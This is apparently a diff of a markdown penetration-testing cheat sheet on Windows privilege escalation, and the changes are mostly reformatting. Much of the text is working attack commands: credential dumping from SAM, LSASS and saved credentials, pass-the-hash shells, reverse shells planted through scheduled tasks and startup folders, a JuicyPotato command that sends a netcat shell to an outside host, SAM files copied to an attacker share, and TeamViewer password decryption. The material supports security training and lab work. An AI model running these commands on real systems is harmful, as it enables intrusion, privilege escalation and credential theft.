+    reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
+    ```
+4.  On our host, we can use the winexe command to spawn a shell using these credentials:
 
-3. We can verify these manually:
-
-   ```text
-   reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
-   reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
-   ```
-
-4. On our host, we can use the winexe command to spawn a shell using these credentials:
-
-   ```text
-   winexe -U 'admin%r4nd0mp44ss' //192.168.1.22 cmd.exe
-   ```
+    ```
+    winexe -U 'admin%r4nd0mp44ss' //192.168.1.22 cmd.exe
+    ```
 
 ### Saved Credentials
 
@@ -988,30 +956,28 @@ The runas command in Windows allows users to execute commands with the permissio
 
 #### Saved Credentials Privilege Escalation
 
-1. You can check for saved credentials with winPEAS:
+1.  You can check for saved credentials with winPEAS:
 
-   ```text
-   > .\winPEASany.exe quiet cmd windowscreds
-   ```
+    ```
+    > .\winPEASany.exe quiet cmd windowscreds
+    ```
+2.  Using the following command, we can manually verify this:
 
-2. Using the following command, we can manually verify this:
-
-   ```text
-   > cmdkey /list
-   ```
-
-3. As the admin user, we may utilize the saved credentials to run any command. On your host \(e.g Kali or Parrot\), start a listener and execute the reverse shell executable:
-4. ```text
+    ```
+    > cmdkey /list
+    ```
+3. As the admin user, we may utilize the saved credentials to run any command. On your host (e.g Kali or Parrot), start a listener and execute the reverse shell executable:
+4. ```
    > runas /savecred /user:admin C:\PrivEsc\reverse.exe
    ```
 
 ### SSH Keys in Registry
 
-### Passwords in Memory 
+### Passwords in Memory&#x20;
 
 Procdump from Sysinternals can be used to create a memory dump of a running process. Try to dump the memory and read the credentials from services like FTP, which have the credentials in clear text in memory.
 
-```text
+```
 procdump.exe -accepteula -ma <proc_name_tasklist>
 ```
 
@@ -1021,30 +987,27 @@ The runas command in Windows allows users to execute commands with the permissio
 
 #### Saved Credentials Privilege Escalation Methodology
 
-1. Use winPEAS to check for saved credentials:
+1.  Use winPEAS to check for saved credentials:
 
-   ```text
-   .\winPEASany.exe quiet cmd windowscreds
-   ```
-
+    ```
+    .\winPEASany.exe quiet cmd windowscreds
+    ```
 2. It may have some credentials for a user that exist.
-3. We can verify this manually using the following command:
+3.  We can verify this manually using the following command:
 
-   ```text
-   cmdkey /list
-   ```
+    ```
+    cmdkey /list
+    ```
+4.  If the saved credentials aren’t present, run the following script to refresh the credential:
 
-4. If the saved credentials aren’t present, run the following script to refresh the credential:
+    ```
+    C:\Dir\savecred.bat
+    ```
+5.  We can use the saved credential to run any command as the admin user. Start a listener On your host and run the reverse shell executable:
 
-   ```text
-   C:\Dir\savecred.bat
-   ```
-
-5. We can use the saved credential to run any command as the admin user. Start a listener On your host and run the reverse shell executable:
-
-   ```text
-   runas /savecred /user:valid_username C:\Users\Public\reverse.exe\
-   ```
+    ```
+    runas /savecred /user:valid_username C:\Users\Public\reverse.exe\
+    ```
 
 ### Configuration Files
 
@@ -1054,79 +1017,73 @@ Some administrators will leave configurations files on the system with passwords
 
 Recursively search for files in the current directory with “pass” in the name, or ending in “.config”:
 
-```text
+```
 dir /s *pass* == *.config
 ```
 
 Recursively search for files in the current directory that contain the word “password” and also end in either .xml, .ini, or .txt:
 
-```text
+```
 findstr /si password *.xml *.ini *.txt
 ```
 
 #### Configuration Files Privilege Escalation Methodology
 
-1. Use winPEAS to search for common files which may contain credentials:
+1.  Use winPEAS to search for common files which may contain credentials:
 
-   ```text
-   .\winPEASany.exe quiet cmd searchfast filesinfo
-   ```
+    ```
+    .\winPEASany.exe quiet cmd searchfast filesinfo
+    ```
+2.  The Unattend.xml file was found. View the contents:
 
-2. The Unattend.xml file was found. View the contents:
-
-   ```text
-   type C:\Windows\Panther\Unattend.xml
-   ```
-
+    ```
+    type C:\Windows\Panther\Unattend.xml
+    ```
 3. A password for the admin user was found. The password is Base64 encoded: cGFzc34vcmQxMjM=
-4. On your host we can easily decode this:
+4.  On your host we can easily decode this:
 
-   ```text
-   echo "cGFzc3dvcmxMjM=" | base64 -d
-   ```
-
+    ```
+    echo "cGFzc3dvcmxMjM=" | base64 -d
+    ```
 5. Once again we can simply use winexe to spawn a shell as the admin user.
 
 ### SAM
 
-The Security Account Manager in Windows stores password hashes \(SAM\). The hashes are encrypted using a key that can be obtained in the SYSTEM file. You can dump the hashes and utilize them using PassTheHash or crack them if you are able to read the SAM and SYSTEM files.
+The Security Account Manager in Windows stores password hashes (SAM). The hashes are encrypted using a key that can be obtained in the SYSTEM file. You can dump the hashes and utilize them using PassTheHash or crack them if you are able to read the SAM and SYSTEM files.
 
 #### SAM/SYSTEM Locations
 
-The SAM and SYSTEM files are located in the `C:\Windows\System32\config` directory. The files are locked while Windows is running. 
+The SAM and SYSTEM files are located in the `C:\Windows\System32\config` directory. The files are locked while Windows is running.&#x20;
 
 Backups of these files may exist in the `C:\Windows\Repair` or `C:\Windows\System32\config\RegBack` directories.
 
 #### SAM/SYSTEM Privilege Escalation Methodology
 
-1. Copy the files back to our host:
+1.  Copy the files back to our host:
 
-   ```text
-   copy C:\Windows\Repair\SAM \\192.168.10.10\tools\
-   copy C:\Windows\Repair\SYSTEM \\192.168.10.10\tools\
-   ```
+    ```
+    copy C:\Windows\Repair\SAM \\192.168.10.10\tools\
+    copy C:\Windows\Repair\SYSTEM \\192.168.10.10\tools\
+    ```
+2.  Download the latest version of the creddump suite:
 
-2. Download the latest version of the creddump suite:
+    ```
+    git clone https://github.com/Neohapsis/creddump7.git
+    ```
+3.  Run the pwdump tool against the SAM and SYSTEM files to extract the hashes:
 
-   ```text
-   git clone https://github.com/Neohapsis/creddump7.git
-   ```
+    ```
+    python2 creddump7/pwdump.py SYSTEM SAM
+    ```
+4.  Crack the admin user hash using hashcat:
 
-3. Run the pwdump tool against the SAM and SYSTEM files to extract the hashes:
-
-   ```text
-   python2 creddump7/pwdump.py SYSTEM SAM
-   ```
-
-4. Crack the admin user hash using hashcat:
-
-   ```text
-   hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
-   ```
+    ```
+    hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
+    ```
 
 Alternatively, save SAM, SYSTEM, and SECURITY with registry:
 
-```text
+```
 reg save hklm\sam c:\SAM
 reg save hklm\system c:\SYSTEM
 reg save hklm\security c:\SECURITY
@@ -1134,7 +1091,7 @@ reg save hklm\security c:\SECURITY
 
 Alternatively, we can use `impacket-secretsdump`:
 
-```text
+```
 impacket-secretsdump -sam /root/SAM -security /root/SECURITY -system /root/SYSTEM LOCAL
 ```
 
@@ -1144,7 +1101,7 @@ impacket-secretsdump -sam /root/SAM -security /root/SECURITY -system /root/SYSTE
 
 The ntdsutil utility can be used to backup the database:
 
-```text
+```
 ntdsutil "ac in ntds" i "cr fu c:\temp" q q
 ```
 
@@ -1152,30 +1109,30 @@ ntdsutil "ac in ntds" i "cr fu c:\temp" q q
 
 Alternatively, you can use `impacket-secretsdump`, however, for this, you need the NTDS:
 
-```text
+```
 impacket-secretsdump -ntds ntds -system SYSTEM LOCAL
 impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
 ```
 
 ### Dump LSASS Login Credentials
 
-The Local Security Authority Subsystem Service \(LSASS\) is a process responsible for enforcing security on a Windows system. By creating a memory dump of the process, we can extract plaintext credentials.
+The Local Security Authority Subsystem Service (LSASS) is a process responsible for enforcing security on a Windows system. By creating a memory dump of the process, we can extract plaintext credentials.
 
 With local administrator rights on a host, open task manager, find lsass.exe, right-click and select “Create Dump File”
 
-![Task Manager -&amp;gt; Details -&amp;gt; lsass.exe](../.gitbook/assets/image%20%2824%29.png)
+![Task Manager -> Details -> lsass.exe](<../.gitbook/assets/image (24).png>)
 
 Create a dump file:
 
-![Create dump file](../.gitbook/assets/image%20%2823%29.png)
+![Create dump file](<../.gitbook/assets/image (23).png>)
 
 Then you will receive this message:
 
-![](../.gitbook/assets/image%20%2826%29.png)
+![](<../.gitbook/assets/image (26).png>)
 
 Mimikatz can then dump the plaintext login credentials:
 
-```text
+```
 sekurlsa::Minidump lsass.DMP
 sekurlsa::logonPasswords
 ```
@@ -1184,7 +1141,7 @@ sekurlsa::logonPasswords
 
 We can dump wi-fi passwords with netsh:
 
-```text
+```
 netsh wlan show profiles
 netsh wlan show profile name="ConnectionName" key=clear
 ```
@@ -1195,31 +1152,30 @@ Windows accepts hashes to authenticate to a number of services. We can use pth t
 
 #### PTH Privilege Escalation Methodology
 
-1. Use the hash with pth-winexe to spawn a command prompt:
+1.  Use the hash with pth-winexe to spawn a command prompt:
 
-   ```text
-   pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.10.10 cmd.exe
-   ```
+    ```
+    pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.10.10 cmd.exe
+    ```
+2.  Use the hash with pth-winexe to spawn a SYSTEM level command prompt:
 
-2. Use the hash with pth-winexe to spawn a SYSTEM level command prompt:
-
-   ```text
-   pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.10.10 cmd.exe
-   ```
+    ```
+    pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.10.10 cmd.exe
+    ```
 
 ## Scheduled Tasks
 
-Windows can be set up to do tasks at certain times, on a regular basis \(e.g. every 5 minutes\), or in response to a specific event \(e.g. a user login\). Tasks are typically performed with the privileges of the person who created them, but administrators can set up tasks to run as other users, including SYSTEM.
+Windows can be set up to do tasks at certain times, on a regular basis (e.g. every 5 minutes), or in response to a specific event (e.g. a user login). Tasks are typically performed with the privileges of the person who created them, but administrators can set up tasks to run as other users, including SYSTEM.
 
 Scheduled Tasks can be created with the Task Scheduler program in Windows.
 
 ### Enumeration
 
-Unfortunately, as a low-privileged user account, there is no straightforward way to enumerate custom tasks that belong to other users. Unless that we have GUI access with RDP or VNC, or something with a UI so that we can use the Task Scheduler program. 
+Unfortunately, as a low-privileged user account, there is no straightforward way to enumerate custom tasks that belong to other users. Unless that we have GUI access with RDP or VNC, or something with a UI so that we can use the Task Scheduler program.&#x20;
 
 The following command list all the scheduled jobs that your user can see:
 
-```text
+```
 schtasks /query /fo LIST /v
 
 /query = display tasks
@@ -1242,26 +1198,23 @@ One way to get hints can be by locating a script or log file that indicates a sc
 
 #### Scheduled Tasks Privilege Escalation
 
-1. Check if we have write access to the script and that's running as Administrator or SYSTEM:
+1.  Check if we have write access to the script and that's running as Administrator or SYSTEM:
 
-   ```text
-   > C:\Dir\accesschk.exe /accepteula -quvw user C:\Dir\Vulnerable.ps1
-   ```
+    ```
+    > C:\Dir\accesschk.exe /accepteula -quvw user C:\Dir\Vulnerable.ps1
+    ```
+2.  Create a backup of the script:
 
-2. Create a backup of the script:
+    ```
+    > copy C:\Dir\Vulnerable.ps1 C:\Temp\
+    ```
+3. Start a listener on your host (e.g Kali or Parrot).
+4.  Add a call to our reverse shell executable to the end of the script with echo:
 
-   ```text
-   > copy C:\Dir\Vulnerable.ps1 C:\Temp\
-   ```
-
-3. Start a listener on your host \(e.g Kali or Parrot\).
-4. Add a call to our reverse shell executable to the end of the script with echo:
-
-   ```text
-   > echo C:\PrivEsc\reverse.exe >> C:\Dir\Vulnerable.ps1
-   ```
-
-5. To finish the exploit, wait for the scheduled task to run \(it should run every x amount of time\).
+    ```
+    > echo C:\PrivEsc\reverse.exe >> C:\Dir\Vulnerable.ps1
+    ```
+5. To finish the exploit, wait for the scheduled task to run (it should run every x amount of time).
 
 ## AlwaysInstallElevated
 
@@ -1290,13 +1243,13 @@ This requests the file from our Python webserver and fetches the MSI.
 
 Now we just need to run it with `msiexec`:
 
-```text
+```
 C:\ProgramData>msiexec /quiet /qn /i rev.msi
 ```
 
 This returns nothing, but there’s a shell at our listening `nc`:
 
-```text
+```
 wixnic@kali$ rlwrap nc -lnvp 443
 listening on [any] 443 ...
 connect to [10.10.14.6] from (UNKNOWN) [10.10.10.239] 61878
@@ -1309,49 +1262,47 @@ nt authority\system
 
 We can grab the root flag from the administrator’s desktop:
 
-```text
+```
 C:\Users\Administrator\Desktop>type root.txt
 82f9ddad************************
 ```
 
 ## Applications
 
-### Insecure GUI Apps 
+### Insecure GUI Apps&#x20;
 
-Users on some \(earlier\) versions of Windows may be given the ability to execute some GUI software with administrator capabilities. There are a variety of methods for spawning command prompts from within GUI software, including native Windows capability. The generated command prompt will execute with administrator privileges because the parent process is running with them.
+Users on some (earlier) versions of Windows may be given the ability to execute some GUI software with administrator capabilities. There are a variety of methods for spawning command prompts from within GUI software, including native Windows capability. The generated command prompt will execute with administrator privileges because the parent process is running with them.
 
 #### Insecure GUI Apps Privilege Escalation
 
-1. Open a command prompt and run:
+1.  Open a command prompt and run:
 
-   ```text
-   > tasklist /V | findstr vulnerable.exe
-   ```
+    ```
+    > tasklist /V | findstr vulnerable.exe
+    ```
 
-   > Note that the executable must be running with admin privileges.
-
+    > Note that the executable must be running with admin privileges.
 2. In the vulnerable GUI executable, click File, then Open.
-3. In the navigation input, replace the contents with a malicious file:
+3.  In the navigation input, replace the contents with a malicious file:
 
-   ```text
-   file://c:/windows/system32/cmd.exe
-   ```
-
+    ```
+    file://c:/windows/system32/cmd.exe
+    ```
 4. Press Enter and then the malicious file will be executed.
 
 ### Startup Apps
 
 By setting shortcuts to programs in a certain directory, each user can determine which apps start when they log in. For apps that should start for all users, Windows additionally includes a startup directory:
 
-```text
+```
 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
 ```
 
 We can use our reverse shell executable to escalate privileges when an admin logs in **if we can create files in this directory**.
 
-It's important to remember that shortcut files \(.lnk\) must be used. To make a shortcut file, use the following VBScript:
+It's important to remember that shortcut files (.lnk) must be used. To make a shortcut file, use the following VBScript:
 
-```text
+```
 Set oWS = WScript.CreateObject("WScript.Shell")
 sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
 Set oLink = oWS.CreateShortcut(sLinkFile)
@@ -1361,20 +1312,18 @@ oLink.Save
 
 #### Startup Apps Privilege Escalation
 
-1. Check the permissions on the StartUp directory with accesschk.exe:
+1.  Check the permissions on the StartUp directory with accesschk.exe:
 
-   ```text
-   .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
-   ```
-
+    ```
+    .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+    ```
 2. The `BUILTIN\Users` group must have write access to this directory.
 3. Using VBScript, create the file CreateShortcut.vbs. If necessary, change the file paths.
-4. Using cscript, run the script:
+4.  Using cscript, run the script:
 
-   ```text
-   > cscript CreateShortcut.vbs
-   ```
-
+    ```
+    > cscript CreateShortcut.vbs
+    ```
 5. Start a listener on Kali, then an admin user must log in to trigger the exploit.
 
 ### Installed Applications
@@ -1385,25 +1334,25 @@ The majority of privilege escalations involving installed apps are due to miscon
 
 Manually enumerate all running programs:
 
-```text
+```
 tasklist /v
 ```
 
 We can also use Seatbelt to search for nonstandard processes:
 
-```text
+```
 .\seatbelt.exe NonstandardProcesses
 ```
 
-winPEAS also has this ability \(note the misspelling\):
+winPEAS also has this ability (note the misspelling):
 
-```text
+```
 .\winPEASany.exe quiet procesinfo
 ```
 
 We can enumerate installed applications with wmic:
 
-```text
+```
 wmic product get name, version, vendor
 wmic qfe get Caption, Description, HotFixID, InstalledOn
 ```
@@ -1418,21 +1367,21 @@ The term "Hot Potato" refers to an attack that combines a spoofing assault with 
 
 ### Hot Potato Privilege Escalation
 
-1. Copy the potato.exe exploit executable over to Windows. 
+1\. Copy the potato.exe exploit executable over to Windows.&#x20;
 
-2. Start a listener on your host \(e.g Kali or Parrot\):
+2\. Start a listener on your host (e.g Kali or Parrot):
 
-```text
+```
 nc -lvnp <PORT>
 ```
 
-3. Run the potato exploit:
+3\. Run the potato exploit:
 
-```text
+```
 .\potato.exe -ip 192.168.10.10 -cmd "C:\Users\Public\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
 ```
 
-4. Wait for a Windows Defender update, or trigger one manually
+4\. Wait for a Windows Defender update, or trigger one manually
 
 ## Juicy Potato
 
@@ -1448,7 +1397,7 @@ The exploit Rotten Potato was relatively restricted. Juicy Potato works in the s
 
 We can execute JuicyPotato with the following example:
 
-```text
+```
 ./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c .\nc.exe -e cmd 10.10.14.8 443"
 ```
 
@@ -1456,7 +1405,7 @@ We can execute JuicyPotato with the following example:
 
 This usually happens when the CLSID is not correct. As we know with the system that we are on a Windows 10 Enterprise machine, we can look for the correct CLSID in [Interesting CLSID](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md) we find the corresponding CLSID, and with the parameter -c:
 
-```text
+```
 ./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c .\nc.exe -e cmd 10.10.14.8 443" -c "{5B3E6773-3A99-4A3D-8096-7765DD11785C}"
 ```
 
@@ -1482,17 +1431,17 @@ This usually happens when the CLSID is not correct. As we know with the system t
 
 ### Port Forwarding
 
-The susceptible program may be listening on an internal port at times \(e.g localhost\). In these circumstances, we must redirect a port on Kali to a Windows internal port.
+The susceptible program may be listening on an internal port at times (e.g localhost). In these circumstances, we must redirect a port on Kali to a Windows internal port.
 
 Enumerate routing tables:
 
-```text
+```
 route print
 ```
 
 Enumerate listening ports:
 
-```text
+```
 netstat -ano
 ```
 
@@ -1510,7 +1459,7 @@ Flags Explained:
 
 Enumerate the firewall of our current profile with:
 
-```text
+```
 netsh advfirewall show currentprofile
 ```
 
@@ -1518,7 +1467,7 @@ netsh advfirewall show currentprofile
 
 Enumerate all the firewall rules:
 
-```text
+```
 netsh advfirewall firewall show rule name=all
 ```
 
@@ -1532,7 +1481,7 @@ netsh advfirewall firewall show rule name=all
 
  PowerShell One-Liner for allowing an inbound port:
 
-```text
+```
 $user = 'minion\administrator'; $pw = '1234test'; $secpw = ConvertTo-SecureString $pw - AsPlainText -Force; $cred = New-Object \
 System.Management.Automation.PSCredential $user, $secpw; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock \
 {New-NetFirewallRule -DisplayName setenso -RemoteAddress 10.10.14.8 -Direction inbound -Action Allow}
@@ -1540,7 +1489,7 @@ System.Management.Automation.PSCredential $user, $secpw; Invoke-Command -Compute
 
 We can enum
 
-## Users & Groups 
+## Users & Groups&#x20;
 
 ### Privileged Groups
 
@@ -1550,7 +1499,7 @@ We can enum
 
 Enumerate the users that are currently logged in:
 
-```text
+```
 qwinsta
 klist sessions
 ```
@@ -1559,7 +1508,7 @@ klist sessions
 
 Enumerate the password policy information with this command:
 
-```text
+```
  net accounts
 ```
 
@@ -1567,7 +1516,7 @@ Enumerate the password policy information with this command:
 
 We may be able to dump information that's on the clipboard, however, this method is easily detected by modern Anti-malware or Anti-virus:
 
-```text
+```
 powershell -command "Get-Clipboard"
 ```
 
@@ -1577,7 +1526,7 @@ powershell -command "Get-Clipboard"
 
 Search for deleted objects and filter for users:
 
-```text
+```
 Get-ADObject -SearchBase "CN=Deleted Objects,DC=domain,DC=local" -Filter {ObjectClass -eq "user"} -IncludeDeletedObjects -Properties *`
 ```
 
@@ -1585,19 +1534,19 @@ Get-ADObject -SearchBase "CN=Deleted Objects,DC=domain,DC=local" -Filter {Object
 
 Create your own user
 
-```text
+```
 net user username password /add /domain
 ```
 
 Add the newly created user to the group Exchange Windows Permissions:
 
-```text
+```
 net group "Exchange Windows Permissions" /add username
 ```
 
 ### TeamViewer
 
-```text
+```
 PS C:\> tasklist | findstr /i 'TeamViewer'
 TeamViewer_Service.exe        3048                            0     18,404 K
 ```
@@ -1606,7 +1555,7 @@ TeamViewer is a remote management software. Since this is the server, it will ha
 
 I can get the version by looking in the `\Program Files (x86)\TeamViewer`:
 
-```text
+```
 PS C:\Program Files (x86)\TeamViewer> ls
 
 
@@ -1624,7 +1573,7 @@ OptionsPasswordAES SecurityPasswordAES SecurityPasswordExported ServerPasswordAE
 
 I can take a look at that registry key:
 
-```text
+```
 PS C:\Program Files (x86)\TeamViewer> cd HKLM:\software\wow6432node\teamviewer\version7
 PS HKLM:\software\wow6432node\teamviewer\version7> get-itemproperty -path .
 
@@ -1659,7 +1608,7 @@ PSProvider                : Microsoft.PowerShell.Core\Registry
 
 `SecurityPasswordAES` is there from the list above. It just dumps a list of integers:
 
-```text
+```
 PS HKLM:\software\wow6432node\teamviewer\version7> (get-itemproperty -path .).SecurityPasswordAES
 255
 155
@@ -1697,11 +1646,11 @@ PS HKLM:\software\wow6432node\teamviewer\version7> (get-itemproperty -path .).Se
 
 #### Decrypt Password
 
-{% embed url="https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/teamviewer\_passwords.rb" %}
+{% embed url="https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/teamviewer_passwords.rb" %}
 
 After some research, I found that it’s using AES128 in CBC mode with a static key and iv. We can easily recreate this in a few lines of Python but we need a library which is this one:
 
-```text
+```
 ❯ pip3 install pycrypto
 Defaulting to user installation because normal site-packages is not writeable
 Collecting pycrypto
@@ -1736,7 +1685,7 @@ print(f"[+] The password is: {password}")
 
 Then we can decrypt the password.
 
-```text
+```
 ❯ python3 decrypt.py
 [+] The password is: !R3m0te!
 ```
@@ -1745,13 +1694,13 @@ Then we can decrypt the password.
 
 View and undocumented key:
 
-```text
+```
 type nsclient.ini
 ```
 
 Display password with `nscp.exe`:
 
-```text
+```
 nscp.exe web -- password --display
 ```
 
@@ -1759,31 +1708,29 @@ nscp.exe web -- password --display
 
 Read the password from XMLfile:
 
-```text
+```
 type confCons.xml
 ```
 
 Decrypt the password cipher text:
 
-```text
+```
 python3 mremoteng_decrypt.py -s CIPHER
 ```
 
-{% embed url="https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/mremoteng\_decrypt.py" %}
+{% embed url="https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/mremoteng_decrypt.py" %}
 
 ### Groups.xml
 
 We can use GPP decrypt to get the password:
 
-```text
+```
 gpp-decrypt CIPHER_HERE
 ```
 
 ### ExploitCapcom
 
 ### SeLoadDriverPrivilege
-
-
 
 
 
